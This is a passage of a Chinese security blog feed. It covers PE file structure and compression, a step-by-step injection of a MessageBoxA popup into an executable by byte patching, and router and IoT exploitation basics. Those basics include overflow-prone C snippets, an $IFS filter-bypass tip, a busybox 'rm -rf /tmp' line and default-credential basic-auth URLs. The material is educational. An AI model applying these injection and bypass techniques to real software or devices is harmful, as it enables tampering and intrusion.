comment">// 程序入口点地址，相对于ImageBase</span>    DWORD BaseOfCode<span class="token punctuation">;</span>  <span class="token comment">// 代码段起始基址RVA</span>    DWORD BaseOfData<span class="token punctuation">;</span>  <span class="token comment">// 数据段起始基址RVA</span>    <span class="token comment">// NT附加域</span>    DWORD ImageBase<span class="token punctuation">;</span>  <span class="token comment">// 镜像基址，即加载到内存的起始地址</span>    DWORD SectionAlignment<span class="token punctuation">;</span>  <span class="token comment">// 节在内存中的对齐大小，以字节为单位</span>    DWORD FileAlignment<span class="token punctuation">;</span>  <span class="token comment">// 节在文件中的对齐大小，以字节为单位</span>    WORD MajorOperatingSystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 主操作系统版本号</span>    WORD MinorOperatingSystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 副操作系统版本号</span>    WORD MajorImageVersion<span class="token punctuation">;</span>  <span class="token comment">// 主镜像版本号</span>    WORD MinorImageVersion<span class="token punctuation">;</span>  <span class="token comment">// 副镜像版本号</span>    WORD MajorSubsystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 主子系统版本号</span>    WORD MinorSubsystemVersion<span class="token punctuation">;</span>  <span class="token comment">// 副子系统版本号</span>    DWORD Win32VersionValue<span class="token punctuation">;</span>  <span class="token comment">// Win32版本值，通常为0</span>    DWORD SizeOfImage<span class="token punctuation">;</span>  <span class="token comment">// 镜像在内存中的大小，以字节为单位</span>    DWORD SizeOfHeaders<span class="token punctuation">;</span>  <span class="token comment">// PE头物理大小，以字节为单位</span>    DWORD CheckSum<span class="token punctuation">;</span>  <span class="token comment">// 校验和，用于验证镜像的完整性</span>    WORD Subsystem<span class="token punctuation">;</span>   <span class="token comment">// 子系统类型</span>    WORD DllCharacteristics<span class="token punctuation">;</span>  <span class="token comment">// DLL特性标志，指示文件是DLL、应用程序等</span>    DWORD SizeOfStackReserve<span class="token punctuation">;</span>  <span class="token comment">// 运行时为每个线程栈保留的内存大小</span>    DWORD SizeOfStackCommit<span class="token punctuation">;</span>  <span class="token comment">// 运行时每个线程栈初始占用的内存大小</span>    DWORD SizeOfHeapReserve<span class="token punctuation">;</span>  <span class="token comment">// 运行时为进程堆保留的内存大小</span>    DWORD SizeOfHeapCommit<span class="token punctuation">;</span>  <span class="token comment">// 运行时进程堆初始占用的内存大小</span>    DWORD LoaderFlags<span class="token punctuation">;</span>  <span class="token comment">// 载入器标志，通常为0</span>    DWORD NumberOfRvaAndSizes<span class="token punctuation">;</span>  <span class="token comment">// 数据目录的项数，固定为IMAGE_NUMBEROF_DIRECTORY_ENTRIES的值</span>    IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 数据目录数组</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212183412327.png" class><h4 id="节表区"><a href="#节表区" class="headerlink" title="节表区"></a>节表区</h4><p>描述 PE 文件各个节的布局和属性，位于 NT 头之后，由一系列 IMAGE_SECTION_HEADER 结构（0x28）构成，每个结构描述一个节，结构排序顺序和描述的节在文件中排序顺序一致。最后以一个空结构结束，所以节表中结构数量为节数量加一</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212184742788.png" class><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185054943.png" class><h3 id="其余特定区域"><a href="#其余特定区域" class="headerlink" title="其余特定区域"></a>其余特定区域</h3><p>text 节、data 节、rsrc 节、数据目录表、导入表、导出表、资源表、重定位表、自定义部分、tls表（线程局部存储表）、加载配置表等</p><p>.relocation 节前 8 字节记录节的 RVA 和<strong>需要进行重定位或修改的条目数量</strong>，每一项都记录了哪些 RVA 地址下的<strong>硬编码寻址</strong>在加载进内存时是需要进行重定位的</p><p>RVA： PE文件的相对虚拟地址（Relative Virual Address）是<strong>PE文件中的数据、模块等运行在内存中的实际地址相对PE文件装载到内存的基址之间的距离</strong></p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185413912.png" class><h3 id="导入表-导出表"><a href="#导入表-导出表" class="headerlink" title="导入表 导出表"></a>导入表 导出表</h3><p><strong>导入表</strong>：存在多个导入表记录每个模块，记录自身使用到的其他模块导出的函数，用于确定调用了哪些模块（dll）的哪些函数，以及确定模块加载进内存后具体函数的地址</p><p>导入表结构体（0x14）如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_IMPORT_DESCRIPTOR</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>        DWORD   Characteristics<span class="token punctuation">;</span>            <span class="token comment">// 0 for terminating null import descriptor</span>        DWORD   OriginalFirstThunk<span class="token punctuation">;</span>         <span class="token comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA) 指向IAT结构</span>    <span class="token punctuation">&#125;</span> DUMMYUNIONNAME<span class="token punctuation">;</span>    DWORD   TimeDateStamp<span class="token punctuation">;</span>                  <span class="token comment">// 时间戳.</span>    DWORD   ForwarderChain<span class="token punctuation">;</span>                 <span class="token comment">// -1 if no forwarders</span>    DWORD   Name<span class="token punctuation">;</span>　　　　　　　　　　　　　　　<span class="token comment">//指向 DLL 名字的 RVA 地址</span>    DWORD   FirstThunk<span class="token punctuation">;</span>                     <span class="token comment">// RVA to IAT (if bound this IAT has actual addresses)</span><span class="token punctuation">&#125;</span> IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span><span class="token keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED <span class="token operator">*</span>PIMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212185413912.png" class> <img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241212190805641.png" class><p>结构体成员：</p><ul><li><p>DUMMYUNIONNAME</p><p>用于确定依赖函数的名称，指向 INT （导入名称表）</p></li><li><p>FirstThunk</p><p>指向 IAT 导入地址表，类似 got 表</p><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/20241208020159-5afedf60-b4c5-1.png" class></li><li><p>Name</p><p>记录一个 RVA 地址，指向依赖的模块的名字</p></li></ul><p><strong>导出表</strong>：只有一个，有子表记录导出符号的地址、名称、序号，需要提供功能的二进制程序（dll）才会有导出表</p><p>包含信息：</p><ul><li>动态链接库提供了什么功能</li><li>向调用者提供输出函数（供使用者调用的函数）在模块中的起始地址</li></ul><p><strong>利用</strong>：通过 dll 名和 dll 导出函数名得到函数地址，也可以通过代码获取：</p><ol><li>通过 Loadlibrary(GetModelHandle) 将 dll 模块映射进内存并返回一个可以被 GetProcAddress 函数使用的句柄</li><li>利用 GetProcAddress 函数获得 dll 的加载地址，然后遍历导出表就可以得到函数地址</li></ol><p>判断导出函数是以序号导出还是以名称导出：</p><p>遍历序号表，判断地址表的下标有没有存在与序号表中，存在就说明是以名称导出，不存在就说明是以序号导出</p><h2 id="PE文件压缩实操总结"><a href="#PE文件压缩实操总结" class="headerlink" title="PE文件压缩实操总结"></a>PE文件压缩实操总结</h2><p>（原理见链接博客</p><p>原程序基址 400000， text 段偏移 1000，rdata 段偏移 2000， data 段偏移 3000</p><h3 id="删除部分"><a href="#删除部分" class="headerlink" title="删除部分"></a>删除部分</h3><p>DOS头从头到 e_lfanew（AddressOfNewExeHeader） 保留其余删除， nt 头到 text 段、text 段到 rdata 段之间多余 \x00 删除，rdata 段末尾保留 4 * \x00 截断字符串，截断字符串到 data 段多余的 \x00 删除</p><p>（删除 nt 头到 text 段的全部 \x00 会报WARNING Line 84: 空结构 和 ERROR Line 1367: 声明中的数组大小无效 的错误但是能运行，不过建议最后熟悉了再删不然影响 010 的 exe模板识别后面节表）</p><h3 id="修改部分"><a href="#修改部分" class="headerlink" title="修改部分"></a>修改部分</h3><p>DosHeader 中 e_lfanew（AddressOfNewExeHeader） 指向 010 中 pe地址</p><p>NtHeader 中的 OptionalHeader：</p><p>​AddressOfEntryPoint 指向 010 中 text 段地址</p><p>​SectionAlignment 、 FileAlignment 改成 4（最小对齐长度）</p><p>​SectionHeaders 中每个节 VirtualAddress 、PointerToRawData 改成 010 中该节地址，SizeOfRawData 改成该节大小</p><h3 id="按偏移修改部分"><a href="#按偏移修改部分" class="headerlink" title="按偏移修改部分"></a>按偏移修改部分</h3><p>NtHeader -&gt; OptionalHeader -&gt; DataDirArray 中的 Import 和 ImportAddressTable</p><p>text 段、rdata 段、data 段中涉及地址的地方（形如402000 &#x2F; 2000的绝对地址或相对地址，具体看原程序在 ida 中哪里是地址）根据 SectionHeaders 中的地址得到偏移再计算修改后的地址</p><p>例如： Import 原值是 2010，所以属于 rdata 段，基址 2000，偏移 10，rdata 段修改后基址 1f0， 所以 Import 需要修改成 1f0 + 10，注意不要算错</p><h2 id="PE文件注入"><a href="#PE文件注入" class="headerlink" title="PE文件注入"></a>PE文件注入</h2><p>*改之前记得先备份一份</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>弹出窗口用到了<code>MessageBoxA</code>函数，用法如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> LPCSTR lpText<span class="token punctuation">,</span> LPCSTR lpCaption<span class="token punctuation">,</span> UINT uType<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该函数的二参是弹窗内容，三参是弹窗标题，本文最终目标就是构造出：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token string">"You are injected!"</span><span class="token punctuation">,</span> <span class="token string">"PE injected"</span><span class="token punctuation">,</span> <span class="token number">0x1040u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>弹出标题为 PE injected 内容为 You are injected！，所以总体思路就是先写入标题和内容的字符串，再将参数传递给对应寄存器，最后调用 MessageBoxA 函数</p><h3 id="写入字符串"><a href="#写入字符串" class="headerlink" title="写入字符串"></a>写入字符串</h3><p>向 rdata 段末尾写入 PE injected 和 You are injected!，这里直接用 ida 修改可能会无法保存，需要用 010 editor 写入字符串：先在 ida 中找到 rdata 末尾位置，在 010 editor 中直接搜索字符串 InitializeSListHead 定位到 rdata 段末尾，在后面添加 PE injected 和 You are injected!，再用 ida 打开就能在 rdata 段末尾看到写入的字符串</p><h3 id="确定字符串偏移"><a href="#确定字符串偏移" class="headerlink" title="确定字符串偏移"></a>确定字符串偏移</h3><p>由于程序开了地址随机化，所以不能直接根据地址获取字符串的位置，这里可以参考原程序中字符串是如何获取地址的，例如 19 行的 xmmword_140005820 就是 rdata 段的一个变量</p><p>程序中获取地址的相关代码：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movdqa xmm0, cs:xmmword_140005820<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接看<code>movdqa  xmm0, cs:xmmword_140005820</code>对应的字节码是<code>66 0F 6F 05 DE 40 00 00</code>，反编译结果如下，也就是使用 rip 加偏移获取的相对地址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movdqa xmm0, xmmword ptr [rip+0x40de]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而这里的 xmmword_140005820 在 ida 中的地址是 0x140005820，上面 010 editor 写入的字符串地址是 0x140006D00，但是由于指令位置不同，同一个变量对应于 rip 的偏移也不同，所以需要结合指令地址去计算字符串的地址，或者直接填一个 rdata 段的地址再根据得到的位置多减少补</p><h3 id="添加-MessageBoxA-函数"><a href="#添加-MessageBoxA-函数" class="headerlink" title="添加 MessageBoxA 函数"></a>添加 MessageBoxA 函数</h3><p>程序中原本是没有 MessageBoxA 函数的，但是在 idata 段有 MessageBoxA 外部函数，所以不能直接通过<code>call MessageBoxA</code>去调用这个函数，需要手动添加<code>MessageBoxA</code>函数，添加内容可以参考<code>exit</code>函数，函数的功能是跳转到 idata 段的对应函数</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp cs:__imp_exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应字节码：<code>FF 25 C8 0D 00 00</code>，同样也是通过 rip 进行相对寻址</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp qword ptr [rip + 0xdc8]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以添加 MessageBoxA 函数的方式也类似，需要向 text 段末尾添加跳转函数，这里和添加字符串一样，直接用 ida 添加可能会保存失败，需要先用 010 editor写入一段跳转代码的字节码，添加完成后再用 ida 修改是可以正常保存的，所以偏移不确定可以先随机添加一个地址（参考其他函数中使用的地址确保添加的地址位于 idata 段的范围方便后续计算调试），再用 ida 根据添加的函数地址和 MessageBoxA 的相对位置用 Change Byte 去调整具体地址即可</p><p>最终构造如下函数：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jmp cs:__imp_MessageBoxA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以直接<code>call MessageBoxA</code>调用该函数</p><h3 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h3><p>将代码写到开栈操作<code>sub     rsp, 0E0h</code>的后面，否则会堆栈不平衡</p><ul><li><p>将汇编翻译成字节码，这里字符串的相对地址是根据上述方式大致确定的地址，将字节码通过 Change Byte 修改(用 ida 的 assembly 修改会报 Invalid operand</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov     r9, 1040hlea     r8, [rip + 0x5662]lea     rdx, [rip + 0x5663]mov     rcx, 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到字节码：<code>49 c7 c1 40 10 00 00 4c 8d 05 62 56 00 00 48 8d 15 63 56 00 00 48 c7 c1 00 00 00 00 </code></p></li><li><p>根据得到的字符串位置和实际写入的字符串位置在 ida 中使用 Change Byte 对地址进行微调直到找到正确地址</p></li><li><p>在添加的汇编代码最后使用 ida 的 assemble 添加<code>call MessageBoxA</code></p></li><li><p>按 tab 确认反编译结果是不是<code>MessageBoxA(0LL, &quot;You are injected!&quot;, &quot;PE injected&quot;, 0x1040u);</code></p></li></ul><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><img src="/2024/12/17/pe-wen-jian-jie-gou-yu-ya-suo/pe-wen-jian-jie-gou-yu-ya-suo/image-20241218212918944.png" class><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>还是我ve1宝哒Ovo</p><p><a href="https://xz.aliyun.com/t/16622">https://xz.aliyun.com/t/16622</a></p><p><a href="https://xz.aliyun.com/t/16622">https://xz.aliyun.com/t/16622</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;PE文件结构&quot;&gt;&lt;a href=&quot;#PE文件结构&quot; class=&quot;headerlink&quot; title=&quot;PE文件结构&quot;&gt;&lt;/a&gt;PE文件结构&lt;/h2&gt;&lt;p&gt;PE : Portable Executable 可移植的可执行文件，Window</summary>
      
    
    
    
    <category term="PE" scheme="https://starrysky1004.github.io/categories/PE/"/>
    
    
    <category term="PE" scheme="https://starrysky1004.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>IoT基础知识</title>
    <link href="https://starrysky1004.github.io/2024/12/17/iot-ji-chu-zhi-shi/iot-ji-chu-zhi-shi/"/>
    <id>https://starrysky1004.github.io/2024/12/17/iot-ji-chu-zhi-shi/iot-ji-chu-zhi-shi/</id>
    <published>2024-12-16T16:29:34.000Z</published>
    <updated>2024-12-16T16:35:06.265Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><h3 id="路由的漏洞利用"><a href="#路由的漏洞利用" class="headerlink" title="路由的漏洞利用"></a>路由的漏洞利用</h3><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ol><li><p><strong>密码破解</strong></p><p>默认密码、弱口令、字典爆破、侧信道（利用服务器响应时间、返回数据包特征，侧信道爆破密码或<code>PIN</code>码）</p></li><li><p><strong>web漏洞</strong></p><p>访问<code>web</code>管理服务与<code>web</code>界面交互，进行渗透（<code>sql</code>注入、<code>rce</code>、<code>csrf</code>、<code>xss</code>）</p></li><li><p><strong>后门</strong></p></li><li><p><strong>缓冲区溢出</strong></p><p>危险函数：<code>strcpy</code>、<code>sprintf</code>、<code>snprintf</code>、<code>strchr</code>、<code>gets</code>，<code>fgetc</code></p><ul><li><p><code>sprintf</code>：<code>sprintf(format,arg1,arg2,arg++)</code>格式化中有<code>%s</code>且没有判断输入长度可能造成栈溢出</p></li><li><p><code>snprintf</code>：返回值是输入长度不是输出长度</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//http1长度大于stack时left也大于stack，snprintf的size为unsigned类型，http2可输入size为负数转成的超大正数</span><span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">snprintf</span><span class="token punctuation">(</span>stack<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf_from_http1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">snprintf</span><span class="token punctuation">(</span>stack<span class="token operator">+</span>left<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token operator">-</span>left<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buf_from_http2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>strchr</code>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//复制长度由？前字符串长度决定，例如index.phpaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa?a=1</span><span class="token keyword">char</span> <span class="token operator">*</span>query <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token char">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>stack<span class="token punctuation">,</span> url<span class="token punctuation">,</span> quey <span class="token operator">-</span> url <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>fgetc</code>：读取单个字符，一般会循环输入，注意循环边界是否会越界</p></li></ul></li><li><p><strong>逻辑漏洞</strong></p><p>对多个功能点组合利用，挖掘攻击链</p></li><li><p><strong>注入类</strong></p><p>敏感函数：<code>system</code>、<code>popen</code>、<code>exec</code>、<code>execve</code></p><p>过滤关键词：例如<code>$IFS</code>绕过空格，<code>xxd</code>、<code>base64</code>编码</p></li></ol><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><a href="https://github.com/giantbranch/mipsAudit">https://github.com/giantbranch/mipsAudit</a></p><p><code>mips</code>静态汇编审计辅助脚本，通过回溯敏感函数审计危险函数</p><p>在<code>IDA-&gt;file-&gt;Script FIle</code>中加载即可使用，加载完成会在控制台输出相应信息，点击跳转，对应位置被高亮显示</p><h3 id="mips-linux"><a href="#mips-linux" class="headerlink" title="mips linux"></a>mips linux</h3><p><code>mips linux</code>：使用<code>mips</code>指令架构的<code>linux</code>系统称为<code>mips linux</code>，广泛应用于嵌入式系统。路由器一般使用<code>mips32</code>和<code>arm</code>指令架构</p><p><code>risc</code>架构：精简指令集，包含<code>mips</code>、<code>arm</code>、<code>risc-v</code></p><h3 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><code>busybox</code>：一个精简终端，路由器的<code>shell</code>是经过裁剪的<code>busybox</code>，<code>shell</code>命令本质是指向<code>busybox</code>的符号链接</p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ busybox <span class="token parameter variable">--help</span>        <span class="token comment"># 查看当前路由器的BusyBox支持的命令</span>$ <span class="token function">uname</span> <span class="token parameter variable">-r</span>              <span class="token comment"># 打印系统信息 + 显示当前运行的Linux内核版本(-r)</span>$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>                <span class="token comment"># 查看当前目录下包含隐藏文件的所有文件(-a) + 文件的详细内容(-l)</span>$ <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp           <span class="token comment"># 强制删除/tmp目录 + 目录下的所有文件(-r) + 无需确认(-f)</span>$ <span class="token function">cp</span> <span class="token parameter variable">-R</span> /tmp ./now      <span class="token comment"># 将/tmp目录复制到./now下</span>$ <span class="token function">du</span> <span class="token parameter variable">-sk</span> fireware.bin   <span class="token comment"># 以KB为单位(-sk)查看bin文件大小</span>$ <span class="token function">ps</span> <span class="token parameter variable">-ef</span>                <span class="token comment"># 查看当前系统正在运行的所有进程 + PID PPID(-f)</span>$ <span class="token function">kill</span> <span class="token parameter variable">-9</span> pid           <span class="token comment"># 强制(-9)终止进程号为pid的进程</span>$ <span class="token function">killall</span> <span class="token parameter variable">-9</span> xxx        <span class="token comment"># 强制(-9)终止进程名为xxx的进程</span>$ <span class="token function">ifconfig</span> <span class="token parameter variable">-a</span>           <span class="token comment"># 查看所有网卡的信息(-a)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><strong>CRLF:</strong> 表示回车和换行，在<code>C</code>语言中表达为 <code>\r\n</code>，对应的十六进制数是<code>0A0D</code>，<code>http</code>请求中所有换行都要用<code>\r\n</code>，因为<code>win</code>的回车相当于<code>linux</code>的回车加换行</p><p>**URI:**统一资源标识符，包含协议、主机名、端口号、路径、查询字符串、片段标识符（以<code>#</code>开始指向资源内部特定部分），例如：<code>https://www.example.com/path/to/resource?query=param#fragment</code></p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><table><thead><tr><th>路径</th><th>作用</th></tr></thead><tbody><tr><td>&#x2F;bin  &#x2F;sbin  &#x2F;usr&#x2F;bin  &#x2F;usr&#x2F;sbin</td><td>存放路由器中的应用程序</td></tr><tr><td>&#x2F;lib  &#x2F;usr&#x2F;lib</td><td>存放程序运行时需要的动态库文件</td></tr><tr><td>&#x2F;etc</td><td>存放配置文件（程序自启动配置文件、脚本文件、服务程序配置文件）</td></tr></tbody></table><h3 id="修复路由器的运行环境"><a href="#修复路由器的运行环境" class="headerlink" title="修复路由器的运行环境"></a>修复路由器的运行环境</h3><p>拿到路由器固件首先需要将路由的环境模拟起来，但是由于缺少硬件在固件运行过程中容易缺失工作模块导致仿真和动调失败</p><p>修复路由器程序的大致执行流程：</p><ul><li>运行程序定位导致程序异常的函数</li><li>分析异常函数，编写具有相同功能的函数，在函数中伪造执行流程和数据，并将编写的函数封装成新的动态库</li><li>使用<code>LD_PRELOAD</code>环境变量加载新的动态库来劫持目标程序中的异常函数，使目标程序执行动态库中的函数</li></ul><h2 id="路由器漏洞原理与利用"><a href="#路由器漏洞原理与利用" class="headerlink" title="路由器漏洞原理与利用"></a>路由器漏洞原理与利用</h2><h3 id="路由器web漏洞"><a href="#路由器web漏洞" class="headerlink" title="路由器web漏洞"></a>路由器web漏洞</h3><ul><li><p>xss</p></li><li><p>csrf</p></li><li><p>路由器基础认证漏洞</p><p><a href="http://admin:admin@192.168.0.1以这种形式可以不需要输入用户名和密码就能完成路由器的直接认证和跳转/">http://admin:admin@192.168.0.1以这种形式可以不需要输入用户名和密码就能完成路由器的直接认证和跳转</a></p><p>通过基础认证可以构造出可跨站的方法，例如让用户点击超链接（钓鱼）、让浏览器自动请求资源，允许攻击者利用一个网站的漏洞影响另一个网站，可以搭配xss和csrf</p><p>xss和csrf是基于登陆状态，路由器基础认证漏洞可以变成登陆状态</p></li></ul><h3 id="路由器后门漏洞"><a href="#路由器后门漏洞" class="headerlink" title="路由器后门漏洞"></a>路由器后门漏洞</h3><p>将可以绕过安全控制而获取路由器访问权的漏洞统一称为路由器后门漏洞</p><p>复现文章：</p><ol><li><a href="https://www.freebuf.com/news/others/266860.html">《揭秘家用路由器0day漏洞挖掘技术》磊科全系列路由器后门漏洞分析</a>、<a href="https://www.anquanke.com/post/id/246510#h2-0">磊科全系列路由器后门漏洞分析</a></li><li><a href="https://cloud.tencent.com/developer/article/1035383">32764端口后门重出江湖，影响多款路由器</a>、<a href="https://github.com/elvanderb/TCP-32764">elvanderb&#x2F;TCP-32764</a></li></ol><h3 id="路由器溢出漏洞"><a href="#路由器溢出漏洞" class="headerlink" title="路由器溢出漏洞"></a>路由器溢出漏洞</h3><p>mips32的函数调用和栈布局不同于x86</p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>没有rbp，进入函数时栈顶指针上抬（减）N字节开辟栈帧，函数返回时重新加上N恢复现场。由于不能随意移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量</p><p>函数调用前，caller 函数会在自己的栈顶预留一部分空间来保存 callee 函数的参数；返回地址会直接存入 $RA 寄存器</p><p>函数调用时，前4个参数通过 <em>a</em>0-a3 传递，参数超过4个会被放入调用参数空间</p><h4 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h4><p>mips32架构有两种函数类型：</p><ul><li>叶子函数：不会再调用其他函数</li><li>非叶子函数</li></ul><p>函数调用过程（A调用B）：</p><ol><li><p>复制当前 <code>$PC</code> 寄存器的值到 <code>$RA</code> 寄存器，然后跳转到函数 B 执行代码</p></li><li><p>程序跳转到函数 B 后</p><ul><li><p>如果函数 B 是<strong>非叶子函数</strong>，则函数 B 里首先会把函数 A 的返回地址入栈，函数返回时，函数 B 先从栈中取出被保存在栈上的返回地址，然后将返回地址存入寄存器 <code>$RA</code>，再使用 “jr $RA” 指令返回函数 A</p></li><li><p>如果函数 B 是<strong>叶子函数</strong>，则在函数返回时直接使用 “jr $RA” 指令返回函数 A</p></li></ul></li></ol><p>参数传递：</p><p>mips通过a0-a3传递前4个参数，其余通过栈传递，栈帧结构如下，栈空间不需要保留前四个参数，但是caller函数预留前四个参数的栈内存空间，callee函数内分配栈空间后将寄存器值复制到caller预留位置中</p><h4 id="缓冲区溢出漏洞利用"><a href="#缓冲区溢出漏洞利用" class="headerlink" title="缓冲区溢出漏洞利用"></a>缓冲区溢出漏洞利用</h4><p>非叶子函数与正常溢出利用相同，叶子函数一般无法直接利用，除非存在可以溢出大量数据的情况，就可以通过一路覆盖到父函数中的返回地址去劫持程序流</p><h2 id="软件层分析"><a href="#软件层分析" class="headerlink" title="软件层分析"></a>软件层分析</h2><h3 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h3><p>路由器固件是包含操作系统的内核以及文件系统的软件，包含了所有可执行程序和配置文件信息。</p><h4 id="获取途径"><a href="#获取途径" class="headerlink" title="获取途径"></a>获取途径</h4><ul><li>路由器厂商网站下载</li><li>登陆路由web管理界面获取相关信息，到对应网站下载固件，通过后台选择新固件升级</li><li>硬件接入，从路由器flash提取固件</li><li>云市场：淘宝，咸鱼</li></ul><h3 id="文件系统-1"><a href="#文件系统-1" class="headerlink" title="文件系统"></a>文件系统</h3><h4 id="基础理论"><a href="#基础理论" class="headerlink" title="基础理论"></a>基础理论</h4><p>文件系统：路由器的文件系统是用于<strong>存储操作系统、配置文件、日志文件</strong>等数据的系统，不同路由器文件系统格式不同，<strong>根文件系统会被打包</strong>成路由器使用的文件系统格式再<strong>组装到固件中</strong></p><p>压缩格式：由于路由器设备大小有限所以存在各种针对文件系统的<strong>压缩格式</strong>，常见的有<code>Squashfs</code>，一个有极高压缩率的只读格式的文件系统</p><p>Squashfs：路由器<strong>根文件系统</strong>通常按照<code>Squashfs</code>文件系统常用压缩格式（GZIP, LZMA, LZO, 